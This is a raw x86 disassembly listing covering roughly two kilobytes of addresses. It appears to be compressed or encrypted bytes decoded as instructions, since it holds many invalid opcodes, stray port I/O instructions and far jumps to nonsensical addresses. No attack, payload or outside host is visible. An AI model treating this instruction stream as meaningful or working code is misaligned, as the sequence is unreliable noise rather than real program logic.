  40b902:	(bad)  
  40b903:	es and eax,0xfc1eacb9
  40b909:	in     eax,0xb4
  40b90b:	sbb    DWORD PTR [esi+eiz*8],eax
  40b90e:	inc    BYTE PTR [ecx]
  40b910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b911:	mov    eax,0xa07c06fe
  40b916:	clc    
  40b917:	adc    bh,ch
  40b919:	out    0xfe,eax
  40b91b:	idiv   BYTE PTR [edi+0x70]
  40b91e:	cld    
  40b91f:	add    DWORD PTR [eax],eax
	...
  40b949:	add    BYTE PTR [eax-0x7b17003c],ch
  40b94f:	sbb    DWORD PTR [eax],ecx
  40b951:	jmp    0x6b2c8a3e
  40b956:	jbe    0x40b93f
  40b958:	imul   ebp,ecx,0x3cff48d3
  40b95e:	dec    edx
  40b95f:	repz test al,0x93
  40b962:	jg     0x40b94a
  40b964:	mov    BYTE PTR [esi+edi*2],ch
  40b967:	jae    0x40b918
  40b969:	adc    ch,bh
  40b96b:	in     eax,0xfd
  40b96d:	sbb    al,0x4a
  40b96f:	repz adc eax,0xfee67f9f
  40b975:	sbb    al,0x7e
  40b977:	out    0x74,al
  40b979:	loope  0x40b990
  40b97b:	rsm    
  40b97d:	add    al,al
  40b97f:	fwait
  40b980:	leave  
  40b981:	ret    0x599b
  40b984:	push   ebp
  40b985:	mov    eax,ebx
  40b987:	ffreep st(3)
  40b989:	cld    
  40b98a:	cmp    eax,0x20146a5f
  40b98f:	scas   al,BYTE PTR es:[edi]
  40b990:	push   es
  40b991:	call   0x403135
  40b996:	push   ds
  40b997:	push   ds
  40b998:	sti    
  40b999:	push   0xbeef5997
  40b99e:	pop    DWORD PTR [eax-0x4e98bea7]
  40b9a4:	int    0x59
  40b9a6:	xchg   esi,eax
  40b9a7:	pop    ecx
  40b9a8:	push   DWORD PTR [ebp+0x5f]
  40b9ab:	xor    DWORD PTR [ebx-0x2a],esp
	...
  40b9d6:	add    BYTE PTR [eax],al
  40b9d8:	and    BYTE PTR [edi+edi*8+0x759c3375],bl
  40b9df:	or     BYTE PTR [edi],bh
  40b9e1:	ret    0xffa9
  40b9e4:	xor    BYTE PTR [edx+0xe2704c2],dl
  40b9ea:	mov    ch,ah
  40b9ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9ed:	xchg   ebx,eax
  40b9ee:	fdiv   st,st(7)
  40b9f0:	xor    BYTE PTR [ebp+ecx*4-0x1f6ecbb],bl
  40b9f7:	jne    0x40ba0c
  40b9f9:	pushf  
  40b9fa:	xor    eax,0xff184fd5
  40b9ff:	out    0x41,eax
  40ba01:	sar    bh,0xff
  40ba04:	sbb    al,0x99
  40ba06:	jne    0x4113be
  40ba0c:	cwde   
  40ba0d:	sbb    eax,0x58d700f7
  40ba12:	add    bh,al
  40ba14:	sbb    ah,BYTE PTR [ebx]
  40ba16:	inc    DWORD PTR [edi]
  40ba18:	out    0x58,eax
  40ba1a:	push   0x0
  40ba1c:	sub    eax,0x3e006a5f
  40ba21:	pop    eax
  40ba22:	add    al,0x8d
  40ba24:	jnp    0x40b9f4
  40ba26:	ror    BYTE PTR [ebx+eax*8-0x4e00c79a],cl
  40ba2d:	inc    edx
  40ba2e:	inc    ecx
  40ba2f:	jne    0x40b9d7
  40ba31:	ins    DWORD PTR es:[edi],dx
  40ba32:	mov    dh,0xfb
  40ba34:	xchg   esi,eax
  40ba35:	repnz cdq 
  40ba37:	add    BYTE PTR [esi],bh
  40ba39:	jmp    0x412e80
	...
  40ba66:	cmp    ecx,DWORD PTR [ebx-0xdc1fe6d]
  40ba6c:	stos   BYTE PTR es:[edi],al
  40ba6d:	mov    al,0xf6
  40ba6f:	mov    dl,0x2
  40ba71:	push   ebx
  40ba73:	in     eax,dx
  40ba74:	sub    dl,BYTE PTR [ecx-0x52]
  40ba77:	and    eax,0x42b55040
  40ba7c:	mov    es,WORD PTR [ebp-0xbfd296]
  40ba82:	out    dx,al
  40ba83:	lahf   
  40ba84:	sub    al,BYTE PTR [ecx-0x72]
  40ba87:	inc    ebp
  40ba88:	inc    eax
  40ba89:	mov    ebx,eax
  40ba8b:	inc    edx
  40ba8c:	cmp    bh,bh
  40ba8e:	inc    ecx
  40ba8f:	pop    edx
  40ba90:	cwde   
  40ba91:	lods   al,BYTE PTR ds:[esi]
  40ba92:	cmp    DWORD PTR [ebp-0x72],ebx
  40ba95:	test   DWORD PTR [esi],edx
  40ba97:	in     eax,dx
  40ba98:	dec    DWORD PTR ds:[esi+0x7f5937da]
  40ba9f:	repnz aas 
  40baa1:	mov    ch,0xe
  40baa3:	add    eax,0x4f11ff3f
  40baa8:	pop    ecx
  40baa9:	dec    eax
  40baaa:	jg     0x40ba9e
  40baac:	sub    dl,BYTE PTR [edx-0x76c0eb2f]
  40bab2:	ret    
  40bab3:	adc    eax,0x87f1ff37
  40bab8:	add    al,0x68
  40baba:	jecxz  0x40bb06
  40babc:	(bad)  
  40babf:	outs   dx,BYTE PTR ds:[esi]
  40bac0:	xor    al,0xf7
  40bac2:	fstp   DWORD PTR [edx-0x5a]
  40bac5:	aas    
  40bac6:	or     ecx,DWORD PTR [esi]
  40bac8:	xor    ebp,eax
	...
  40baf2:	add    BYTE PTR [eax],al
  40baf4:	leave  
  40baf5:	sti    
  40baf6:	sbb    al,0x6f
  40baf8:	shl    ebx,0x5f
  40bafb:	mov    DWORD PTR [edx+0x243f85eb],ebp
  40bb01:	pop    ebx
  40bb02:	adc    DWORD PTR [esi],ebp
  40bb04:	pop    es
  40bb05:	call   0x3f75:0xeaeb3ee9
  40bb0c:	cdq    
  40bb0d:	jecxz  0x40bb2a
  40bb0f:	pop    ecx
  40bb10:	push   es
  40bb11:	call   0x3f55:0xb3f02be9
  40bb18:	mov    bh,0xdd
  40bb1a:	inc    eax
  40bb1b:	aaa    
  40bb1c:	jns    0x40bb01
  40bb1e:	jae    0x40baa9
  40bb20:	xchg   edx,eax
  40bb21:	jmp    0x40bb60
  40bb23:	aas    
  40bb24:	push   cs
  40bb25:	jae    0x40bb10
  40bb27:	fsin   
  40bb29:	pop    edx
  40bb2a:	cs jns 0x40bb7b
  40bb2d:	jmp    0x40bb54
  40bb2f:	aas    
  40bb30:	push   ecx
  40bb31:	sub    eax,0x5afecc34
  40bb36:	add    ebx,esi
  40bb38:	nop
  40bb39:	jecxz  0x40bb48
  40bb3b:	or     edi,esi
  40bb3d:	addr16 loopne 0x40bac2
  40bb40:	repz push ebp
  40bb43:	sub    DWORD PTR ds:[eax+0x7c],ebx
  40bb47:	adc    esp,DWORD PTR [ecx]
  40bb49:	sub    al,0x5e
  40bb4b:	mov    DWORD PTR [esi],ebx
  40bb4d:	jmp    0x40bb34
  40bb4f:	outs   dx,BYTE PTR ds:[esi]
  40bb51:	repz call 0xc223c4c6
  40bb57:	pop    ss
	...
  40bb80:	add    BYTE PTR [eax],al
  40bb82:	xor    eax,0x8e06551b
  40bb87:	repz mov esp,0xa5e2f16a
  40bb8d:	mov    dh,bl
  40bb8f:	jmp    0xe900:0x4820b5ff
  40bb96:	cmp    eax,0x88dbcde
  40bb9b:	loop   0x40bb9b
  40bb9d:	jmp    0x54c41c33
  40bba2:	adc    edx,ebp
  40bba4:	dec    BYTE PTR [esi+0x6a75673d]
  40bbaa:	mov    esi,0x687ef6f3
  40bbaf:	pop    ebx
  40bbb0:	je     0x40bbb7
  40bbb2:	aam    0xe2
  40bbb4:	mov    esp,DWORD PTR [ebp+esi*8-0x17]
  40bbb8:	(bad)  
  40bbb9:	ins    WORD PTR es:[edi],dx
  40bbbb:	loope  0x40bb71
  40bbbd:	inc    ebp
  40bbbe:	push   eax
  40bbbf:	loop   0x40bbbf
  40bbc1:	inc    ecx
  40bbc2:	test   DWORD PTR [edi],eax
  40bbc4:	dec    DWORD PTR [esi+0x44]
  40bbc7:	sbb    esi,DWORD PTR [ebp+ebx*4-0x44]
  40bbcb:	mov    al,ds:0xe22836d7
  40bbd0:	(bad)  
  40bbd1:	mov    esp,0xe9007a74
  40bbd6:	sub    BYTE PTR [ecx-0xcba6302],ah
  40bbdc:	push   ecx
  40bbdd:	push   ecx
  40bbde:	or     dl,ah
  40bbe0:	(bad)  
  40bbe1:	pop    esp
  40bbe2:	adc    edx,ebp
  40bbe4:	dec    BYTE PTR [esi]
	...
  40bc0e:	add    BYTE PTR [eax],al
  40bc10:	js     0x40bc7a
  40bc12:	or     BYTE PTR [ecx],dl
  40bc14:	fwait
  40bc15:	mov    bl,0xfe
  40bc17:	(bad)  
  40bc18:	imul   ebp,DWORD PTR [eax-0x1d9c0119],0xfffffffe
  40bc1f:	je     0x40bc66
  40bc21:	repz xchg edi,eax
  40bc23:	xchg   ecx,eax
  40bc24:	push   ebx
  40bc25:	loop   0x40bc25
  40bc27:	xchg   esp,eax
  40bc28:	push   0xffffffea
  40bc2a:	(bad)  
  40bc2b:	(bad)  
  40bc2c:	inc    ebx
  40bc2d:	test   al,0xe3
  40bc2f:	(bad)  
  40bc30:	cmp    esp,edx
  40bc32:	inc    BYTE PTR [eax]
  40bc34:	xor    cl,BYTE PTR [edi-0x18]
  40bc37:	pop    eax
  40bc38:	iret   
  40bc39:	pop    ds
  40bc3a:	(bad)  
  40bc3b:	jmp    DWORD PTR [edx+0x37]
  40bc3e:	idiv   edi
  40bc40:	test   al,0x1f
  40bc42:	jne    0x40bc4c
  40bc44:	scas   eax,DWORD PTR es:[edi]
  40bc45:	inc    edx
  40bc46:	test   al,0xff
  40bc48:	test   al,0x1f
  40bc4a:	mov    ch,0xe4
  40bc4c:	mov    al,ds:0x6fe8ff1f
  40bc51:	je     0x40bc52
  40bc53:	(bad)  
  40bc54:	mov    eax,0x28f7ec69
  40bc59:	and    al,ch
  40bc5b:	dec    ebp
  40bc5c:	cld    
  40bc5d:	pop    ds
  40bc5e:	(bad)  
  40bc5f:	call   DWORD PTR [edx+0x2f]
  40bc62:	idiv   edi
  40bc64:	sbb    BYTE PTR [edi],ch
  40bc66:	inc    edx
  40bc67:	stos   DWORD PTR es:[edi],eax
  40bc68:	call   0xe7f6bb8c
  40bc6d:	daa    
  40bc6e:	(bad)  
  40bc6f:	(bad)  
  40bc70:	jmp    edi
  40bc72:	test   eax,0xff
	...
  40bc9b:	add    BYTE PTR [eax],al
  40bc9d:	add    al,bh
  40bc9f:	pop    ds
  40bca0:	inc    ebp
  40bca1:	clc    
  40bca2:	push   cs
  40bca3:	sbb    eax,0x2028fffd
  40bca8:	jne    0x40bca6
  40bcaa:	dec    DWORD PTR [ebx]
  40bcac:	xchg   esi,eax
  40bcad:	add    BYTE PTR [edi-0x6c],ah
  40bcb0:	ret    0x5708
  40bcb3:	or     BYTE PTR [edx-0xb6d2b14],cl
  40bcb9:	call   edx
  40bcbb:	push   eax
  40bcbc:	call   0x984fac
  40bcc1:	mov    edx,esp
  40bcc3:	and    al,0xff
  40bcc5:	jne    0x40bcf6
  40bcc7:	xor    eax,0x2028ab21
  40bccc:	mov    DWORD PTR [ebp+0x1b],eax
  40bccf:	and    BYTE PTR [ebp-0x4],dh
  40bcd2:	call   0x3f40b380
  40bcd7:	jg     0x40bce9
  40bcd9:	call   0xff7c8615
  40bcde:	inc    ebp
  40bcdf:	mov    dl,0xb6
  40bce1:	cmp    eax,0x6a3837b7
  40bce6:	ds ja  0x40bcaf
  40bce9:	rep outs dx,BYTE PTR ds:[esi]
  40bceb:	mov    cl,0xb5
  40bced:	sti    
  40bcee:	out    0x53,al
  40bcf0:	pop    eax
  40bcf1:	dec    ecx
  40bcf3:	in     eax,dx
  40bcf4:	inc    edx
  40bcf5:	je     0x40bd0e
  40bcf7:	pop    edx
  40bcf8:	add    al,0x10
  40bcfa:	test   eax,0x46753c90
  40bcff:	retf   0xa786
	...
  40bd2a:	add    BYTE PTR [eax],al
  40bd2c:	test   eax,0xa6753c61
  40bd31:	imul   esi,DWORD PTR [esi+0xae7990b],0x3bd1e2e8
  40bd3b:	dec    DWORD PTR [ecx+0xbff3707]
  40bd41:	xchg   BYTE PTR [esi*2-0x586265ba],bh
  40bd48:	jno    0x40bce3
  40bd4a:	cmp    al,0x75
  40bd4c:	push   0xffffff8a
  40bd4e:	ins    BYTE PTR es:[edi],dx
  40bd4f:	stos   BYTE PTR es:[edi],al
  40bd50:	popa   
  40bd51:	sub    DWORD PTR [edx-0x3e],ecx
  40bd54:	inc    esi
  40bd55:	repnz aad 0x8a
  40bd58:	bound  esi,QWORD PTR [ebp+0x47]
  40bd5b:	call   0xbf6fe50
  40bd60:	push   esi
  40bd61:	retf   
  40bd62:	imul   edi,edi,0x39
  40bd65:	std    
  40bd66:	inc    edx
  40bd67:	jne    0x40bda4
  40bd69:	mov    eax,0xf236c249
  40bd6e:	lea    eax,[ebp+0x2e]
  40bd71:	ret    0x753b
  40bd74:	dec    edx
  40bd75:	pop    edx
  40bd76:	call   0xe69bcf2a
  40bd7b:	paddd  mm1,QWORD PTR [edi+0x65]
  40bd7f:	sahf   
  40bd80:	ds pop ebx
  40bd82:	jmp    0xc12030c1
  40bd87:	mov    ah,BYTE PTR [edi+ebx*8-0x107c723b]
  40bd8e:	mov    ebp,0xb1
	...
  40bdb7:	add    BYTE PTR [eax],al
  40bdb9:	add    ch,ah
  40bdbb:	fistp  QWORD PTR [ebx]
  40bdbd:	sub    cl,bl
  40bdbf:	gs mov cl,0x2c
  40bdc2:	mov    dh,BYTE PTR [ebp+eiz*4-0x729a4ac5]
  40bdc9:	das    
  40bdca:	ja     0x40be3f
  40bdcc:	rcr    ch,1
  40bdce:	(bad)  
  40bdcf:	pop    edx
  40bdd0:	aaa    
  40bdd1:	sub    al,0x92
  40bdd3:	enter  0x3e8,0x35
  40bdd7:	sbb    esi,esp
  40bdd9:	add    eax,0x34621d95
  40bdde:	and    dl,BYTE PTR es:[ebx]
  40bde1:	lds    edx,FWORD PTR [ecx+0x3e9102f7]
  40bde7:	pop    ebx
  40bde8:	jmp    0x1ac:0x4165b733
  40bdef:	test   DWORD PTR [eax-0x7d0cf7fd],ebp
  40bdf5:	xchg   edx,eax
  40bdf6:	ds pop ebx
  40bdf8:	repnz inc ebx
  40bdfa:	jmp    0x40be58
  40bdfc:	inc    edx
  40bdfd:	pop    ds
  40bdfe:	les    ecx,FWORD PTR [edx+0x27]
  40be01:	add    al,0x3e
  40be03:	mov    edi,DWORD PTR [ebx+0x1df2d33a]
  40be09:	mov    cl,0x39
  40be0b:	repz (bad) 
  40be0f:	fbstp  TBYTE PTR [edx+0x694bb9db]
  40be15:	cli    
  40be16:	sub    DWORD PTR [eax+0x3b],ebp
  40be19:	lods   al,BYTE PTR ds:[esi]
  40be1a:	ds dec ebx
  40be1c:	add    BYTE PTR [esi],al
	...
  40be46:	add    BYTE PTR [eax],al
  40be48:	xchg   esp,eax
  40be49:	fidiv  WORD PTR [ecx+eiz*8+0x65]
  40be4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be4f:	out    0x44,al
  40be51:	fidiv  WORD PTR [ebp+ebx*8+0x44]
  40be55:	push   0x56aed6ec
  40be5a:	call   0xff1f1e0d
  40be5f:	(bad)  
  40be60:	scas   al,BYTE PTR es:[edi]
  40be61:	repnz out 0xb9,eax
  40be64:	push   edx
  40be65:	fdivp  st(6),st
  40be67:	fs (bad) 
  40be69:	out    dx,al
  40be6a:	dec    edi
  40be6b:	shl    DWORD PTR [ebx+ebp*4],0xfe
  40be6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be70:	sbb    BYTE PTR [ebx+0x5e],bl
  40be73:	mov    al,0x7b
  40be75:	push   ebx
  40be76:	add    BYTE PTR [ecx+ecx*8],bh
  40be79:	out    dx,eax
  40be7a:	and    BYTE PTR [ebp+0x13007169],0x4f
  40be81:	fidiv  WORD PTR [ecx+esi*8+0x55]
  40be85:	push   ebp
  40be86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be87:	jbe    0x40bedd
  40be89:	aam    0x44
  40be8b:	ins    DWORD PTR es:[edi],dx
  40be8c:	in     eax,0x57
  40be8e:	pop    edx
  40be8f:	test   al,0x3d
  40be91:	fidiv  WORD PTR [ecx+esi*8+0x55]
  40be95:	mov    dh,0xfb
  40be97:	push   esi
  40be98:	xor    al,0x71
  40be9a:	add    cl,al
  40be9c:	xchg   esp,eax
  40be9d:	test   BYTE PTR [ecx-0x17],al
  40bea0:	xchg   ebp,eax
  40bea1:	xchg   ecx,eax
  40bea2:	pop    edx
  40bea3:	test   al,0x3d
  40bea5:	fidiv  WORD PTR [esp+ebx*1]
  40bea8:	test   DWORD PTR [ebx+0x4100],ebx
	...
  40bed6:	aam    0xae
  40bed8:	(bad)  
  40bed9:	cmp    BYTE PTR es:[ebx],bl
  40bedc:	je     0x40bee1
  40bede:	xchg   edx,eax
  40bedf:	xor    BYTE PTR [edx-0x58],bl
  40bee2:	cmp    eax,0xa662e88b
  40bee7:	fdivp  st(6),st
  40bee9:	add    bh,al
  40beeb:	or     esi,edi
  40beed:	jne    0x40bf1e
  40beef:	xor    ah,bl
  40bef1:	(bad)  
  40bef2:	adc    BYTE PTR [eax+ebp*8],ah
  40bef5:	mov    DWORD PTR [esi+0x21],edi
  40bef8:	jmp    FWORD PTR [edx+0x3d]
  40befb:	das    
  40befc:	fisubr DWORD PTR [ebp-0x3ff4dc20]
  40bf02:	fwait
  40bf03:	(bad)  
  40bf04:	data16 and ch,BYTE PTR ds:0xf4fff1a
  40bf0b:	mov    ecx,0xaea0ffab
  40bf10:	sub    al,0x5a
  40bf12:	es push edi
  40bf14:	push   eax
  40bf15:	call   0x403546
  40bf1a:	pop    es
  40bf1b:	pop    es
  40bf1c:	(bad)  
  40bf1d:	jne    0x40beee
  40bf1f:	xor    DWORD PTR [ebx-0x17dc2f02],esi
  40bf25:	pop    ecx
  40bf26:	(bad)  
  40bf27:	and    edi,edi
  40bf29:	push   0xffffffa3
  40bf2b:	xor    DWORD PTR [edx+0xb2420ad],ebp
  40bf31:	rcr    BYTE PTR [ebx+0x2d2266fc],0x1a
  40bf38:	dec    DWORD PTR [edi+0x0]
	...
  40bf63:	add    bh,ch
  40bf65:	call   0xaf21bf15
  40bf6a:	sub    al,0x5a
  40bf6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf6d:	pop    ecx
  40bf6e:	push   eax
  40bf6f:	call   0x4035b0
  40bf74:	(bad)  
  40bf75:	or     esi,edi
  40bf77:	jne    0x40bfe8
  40bf79:	xor    DWORD PTR [ebx-0x17dbef02],eax
  40bf7f:	sub    DWORD PTR [esi+0x746aff23],edi
  40bf85:	xor    DWORD PTR [edx-0x53],edi
  40bf88:	and    BYTE PTR [ebx+ecx*1],ah
  40bf8b:	sar    BYTE PTR [esi],0xbe
  40bf8e:	frstor [edi+0x5c]
  40bf91:	test   al,0xc1
  40bf93:	(bad)  
  40bf94:	jns    0x40bfe0
  40bf96:	add    ch,BYTE PTR [ebp+0x2daade21]
  40bf9c:	je     0x40bf51
  40bf9e:	add    dl,BYTE PTR [eax+0x26]
  40bfa1:	jmp    0xfed4:0x2309ff66
  40bfa8:	mov    ebp,edx
  40bfaa:	sub    dl,BYTE PTR [ebx-0x8]
  40bfad:	add    eax,0xdaf7e838
  40bfb2:	aaa    
  40bfb3:	(bad)  
  40bfb4:	jmp    0x6c3ff7d8
  40bfb9:	jmp    0xc937:0xa5a06c2a
  40bfc0:	cld    
  40bfc1:	test   BYTE PTR [edx],0x55
  40bfc4:	mov    ch,0xc6
  40bfc6:	add    esp,0x0
	...
  40bff0:	add    BYTE PTR [eax],al
  40bff2:	loop   0x40bfb9
  40bff4:	aaa    
  40bff5:	dec    ebx
  40bff7:	das    
  40bff8:	cmp    BYTE PTR [eax-0x4f],dl
  40bffb:	inc    edi
  40bffc:	adc    al,0xff
  40bffe:	xor    esp,esi
  40c000:	sub    al,BYTE PTR [ebx+ecx*8]
  40c003:	repnz add cl,BYTE PTR [ebx]
  40c006:	jle    0x40bffd
  40c008:	jge    0x40bfc8
  40c00a:	aas    
  40c00b:	repnz add al,bh
  40c00e:	add    edi,DWORD PTR [edx+0x3]
  40c011:	add    BYTE PTR [esi],bh
  40c013:	repnz aas 
  40c015:	inc    ebp
  40c016:	jb     0x40bf9d
  40c018:	add    BYTE PTR [eax],al
  40c01a:	sbb    BYTE PTR ds:[ebx],al
  40c01d:	push   0x3e
  40c01f:	or     BYTE PTR [ebx],al
  40c021:	push   0x3e
  40c023:	outs   dx,DWORD PTR ds:[esi]
  40c024:	mov    esi,0x7e76eef3
  40c029:	hlt    
  40c02a:	dec    ecx
  40c02b:	sub    eax,0x5b495038
  40c030:	pushf  
  40c031:	cmp    eax,DWORD PTR [ecx+0x66]
  40c034:	sbb    eax,0xe8c7102b
  40c039:	add    eax,DWORD PTR [ebp+0x1b]
  40c03c:	xchg   ebp,eax
  40c03d:	(bad)  
  40c03e:	push   ss
  40c03f:	(bad)  
  40c041:	add    edi,DWORD PTR [esi]
  40c043:	jae    0x40c07d
  40c045:	retf   
  40c046:	jle    0x40c0a3
  40c048:	imul   BYTE PTR [ebp+0x67c5f341]
  40c04e:	or     esp,ebx
  40c050:	cmp    BYTE PTR [ebx+0x3063cdee],cl
	...
  40c07e:	add    BYTE PTR [eax],al
  40c080:	icebp  
  40c081:	fcmovnbe st,st(5)
  40c083:	aam    0x8f
  40c085:	repz cmc 
  40c087:	addr16 jmp 0xeec23068
  40c08d:	jecxz  0x40c04c
  40c08f:	aaa    
  40c090:	out    0x6d,al
  40c092:	xor    DWORD PTR [edi],0xabe970d1
  40c098:	dec    eax
  40c099:	sub    DWORD PTR [eax],0x98a5c104
  40c09f:	das    
  40c0a0:	mov    ecx,0x45b195db
  40c0a5:	repz sbb BYTE PTR [ebx-0x57],ch
  40c0a9:	fld    TBYTE PTR [edi-0x7f]
  40c0ac:	call   0x15b:0x24377de3
  40c0b3:	mov    esp,?
  40c0b5:	cdq    
  40c0b6:	jmp    0x5e2b93f1
  40c0bb:	aaa    
  40c0bc:	sbb    ebx,0x856607d3
  40c0c2:	xor    BYTE PTR [edi],0x71
  40c0c5:	shl    DWORD PTR [ebx+0x24],1
  40c0c8:	jno    0x40c0a5
  40c0ca:	inc    ebp
  40c0cb:	stos   BYTE PTR es:[edi],al
  40c0cc:	popa   
  40c0cd:	jae    0x40c09d
  40c0cf:	fsin   
  40c0d1:	pop    edx
  40c0d2:	add    BYTE PTR [esi],dh
  40c0d4:	iret   
  40c0d5:	jmp    0xf574:0xdc112ef6
  40c0dc:	adc    eax,0x711eab21
  40c0e1:	in     al,0x84
  40c0e3:	add    eax,0x0
	...
  40c10c:	add    BYTE PTR [eax],al
  40c10e:	popa   
  40c10f:	(bad)  
  40c111:	cmp    DWORD PTR ds:0xfaa37643,0xffffffda
  40c118:	std    
  40c119:	xor    al,0x52
  40c11b:	sar    dh,cl
  40c11d:	test   BYTE PTR [eax+0x50],0xc
  40c121:	add    DWORD PTR [ecx],esi
  40c123:	push   es
  40c124:	jmp    esi
  40c126:	mov    dl,0xe0
  40c128:	out    0xd6,eax
  40c12a:	xor    dl,bl
  40c12c:	imul   ebp,ecx,0x2859eca5
  40c132:	inc    edx
  40c133:	fidiv  DWORD PTR [ecx+edi*4-0x410125f0]
  40c13a:	mov    fs,WORD PTR [esi-0x18]
  40c13d:	in     eax,dx
  40c13e:	fs (bad) 
  40c141:	pusha  
  40c142:	mov    esi,0x8a6f6b7
  40c147:	fidivr WORD PTR [ebp+eax*4-0x16012598]
  40c14e:	out    dx,al
  40c14f:	arpl   WORD PTR [ebx-0x12da2b4],ax
  40c155:	xchg   BYTE PTR ds:0x166a654f,bh
  40c15b:	(bad)  
  40c15c:	div    BYTE PTR [esi+0x48]
  40c15f:	pop    ebx
  40c160:	je     0x40c16f
  40c162:	mov    ebp,0x485ee818
  40c167:	(bad)  
  40c169:	aam    0x8c
  40c16b:	inc    edx
  40c16c:	add    cl,ch
  40c16e:	sbb    BYTE PTR [ecx],bl
  40c170:	call   esp
	...
  40c19a:	add    BYTE PTR [eax],al
  40c19c:	xor    eax,0xb30065c3
  40c1a1:	xchg   ecx,eax
  40c1a2:	(bad)  
  40c1a3:	call   edx
  40c1a5:	xor    edi,0x759108ff
  40c1ab:	or     bh,bh
  40c1ad:	push   ebx
  40c1ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1af:	call   FWORD PTR [eax]
  40c1b1:	xchg   ecx,eax
  40c1b2:	mov    ch,0xe8
  40c1b4:	push   eax
  40c1b5:	xchg   ecx,eax
  40c1b6:	(bad)  
  40c1b7:	call   edx
  40c1b9:	gs call 0xffd2456b
  40c1bf:	jmp    DWORD PTR [edx+0x7a]
  40c1c2:	idiv   edi
  40c1c4:	sbb    BYTE PTR [eax-0xfc0f78b],dl
  40c1ca:	mov    ds:0xb59018ff,eax
  40c1cf:	loopne 0x40c1b1
  40c1d1:	(bad)  
  40c1d2:	(bad)  
  40c1d3:	call   DWORD PTR [edx-0x3c6f1799]
  40c1d9:	(bad)  
  40c1da:	(bad)  
  40c1db:	call   edx
  40c1dd:	xor    dh,bh
  40c1df:	(bad)  
  40c1e0:	clc    
  40c1e1:	(bad)  
  40c1e2:	jne    0x40c1ec
  40c1e4:	out    dx,eax
  40c1e5:	fsub   QWORD PTR [ebx-0x4a707701]
  40c1eb:	in     al,0x90
  40c1ed:	(bad)  
  40c1ee:	(bad)  
  40c1ef:	call   0x3ffa27
  40c1f4:	fmul   DWORD PTR [ecx-0x20]
  40c1f7:	test   eax,0x59e88f
  40c1fd:	nop
  40c1fe:	(bad)  
  40c1ff:	inc    DWORD PTR [eax]
	...
  40c229:	add    BYTE PTR [edx-0x7d],ah
  40c22c:	idiv   edi
  40c22e:	sbb    BYTE PTR [edi-0x6ff758b2],al
  40c234:	push   DWORD PTR [ebp-0x7841]
  40c23a:	out    dx,eax
  40c23b:	fwait
  40c23c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c23d:	call   FWORD PTR [eax]
  40c23f:	nop
  40c240:	mov    ch,0xdc
  40c242:	cmp    DWORD PTR ds:0x5d6b56ff,esi
  40c249:	jmp    DWORD PTR [ecx+0x20]
  40c24c:	outs   dx,DWORD PTR ds:[esi]
  40c24d:	lock push ecx
  40c24f:	cwde   
  40c250:	xor    eax,0x33bfcbff
  40c255:	jne    0x40c28d
  40c257:	sbb    al,0xf7
  40c259:	std    
  40c25a:	inc    ecx
  40c25b:	xor    BYTE PTR ds:0x35722eb5,0xff
  40c262:	es iret 
  40c264:	pop    ebx
  40c265:	jmp    FWORD PTR [ecx]
  40c267:	push   0xffffffbf
  40c269:	not    DWORD PTR [edi]
  40c26b:	hlt    
  40c26c:	xor    al,0xff
  40c26e:	sbb    edx,ebx
  40c270:	lods   eax,DWORD PTR ds:[esi]
  40c271:	sti    
  40c272:	or     edx,DWORD PTR es:[eax+0x427b3e00]
  40c279:	or     al,0x3e
  40c27b:	xchg   edi,eax
  40c27c:	mov    esp,ebp
  40c27e:	mov    ebp,0x3e6a36fe
  40c283:	sbb    al,0xe
  40c285:	push   DWORD PTR [ebx-0x46]
  40c288:	sub    ch,BYTE PTR [esi]
  40c28a:	call   0x0:0x8933a1
	...
  40c2b5:	add    BYTE PTR [eax],al
  40c2b7:	add    BYTE PTR [ebx+0x749bab16],al
  40c2bd:	add    DWORD PTR [eax+ebp*2],0x3c
  40c2c1:	ret    0x8002
  40c2c4:	shl    DWORD PTR [edi+0xc],0xe8
  40c2c8:	mov    cl,0xf7
  40c2ca:	xor    edi,edi
  40c2cc:	es dec esi
  40c2ce:	fld    DWORD PTR [eax+0x3e]
  40c2d1:	jmp    0x833797c3
  40c2d6:	add    al,0xff
  40c2d8:	adc    ecx,edx
  40c2da:	sub    ah,ah
  40c2dc:	xchg   ebx,eax
  40c2dd:	push   ecx
  40c2de:	xor    al,0xff
  40c2e0:	adc    eax,DWORD PTR [esi+0x34]
  40c2e3:	jne    0x40c31b
  40c2e5:	pop    ebx
  40c2e6:	push   ecx
  40c2e7:	ret    0xd89d
  40c2ea:	pop    ebp
  40c2eb:	dec    edx
  40c2ec:	jl     0x40c34d
  40c2ee:	jmp    0x680877c1
  40c2f3:	aas    
  40c2f4:	adc    al,0x45
  40c2f7:	xor    al,0xcb
  40c2f9:	push   ds
  40c2fa:	cmp    eax,0xd94e50d3
  40c2ff:	xor    al,0xd3
  40c301:	inc    cx
  40c303:	pop    edx
  40c304:	lods   al,BYTE PTR ds:[esi]
  40c305:	pop    ebx
  40c306:	jmp    0x64a8c113
  40c30b:	jne    0x40c34c
  40c30d:	pop    ebx
  40c30e:	jmp    0xe914464f
  40c313:	add    edi,DWORD PTR [esi]
  40c315:	pop    ebx
  40c316:	cs mov esi,0x3e5d80d
	...
  40c344:	add    BYTE PTR [eax],al
  40c346:	ds inc ebp
  40c348:	jmp    0xe982ccf6
  40c34d:	test   eax,0x382be701
  40c352:	mov    fs,esi
  40c354:	arpl   WORD PTR [eax],di
  40c356:	jmp    0xe9159932
  40c35b:	dec    ebp
  40c35c:	shl    DWORD PTR [ebx],1
  40c35e:	imul   edx,edi,0xffffffd0
  40c361:	pop    edi
  40c362:	lods   al,BYTE PTR ds:[esi]
  40c363:	pop    edx
  40c364:	jmp    0xec8f5567
  40c369:	sbb    al,0xbf
  40c36b:	pop    ecx
  40c36c:	jmp    0x314b1974
  40c371:	lds    edi,FWORD PTR [ecx-0x59ebec28]
  40c377:	(bad)  
  40c378:	aas    
  40c379:	xor    ebp,DWORD PTR [ecx-0x4cab9dd6]
  40c37f:	fnstsw WORD PTR [ebx+edi*1-0x67]
  40c383:	xlat   BYTE PTR ds:[ebx]
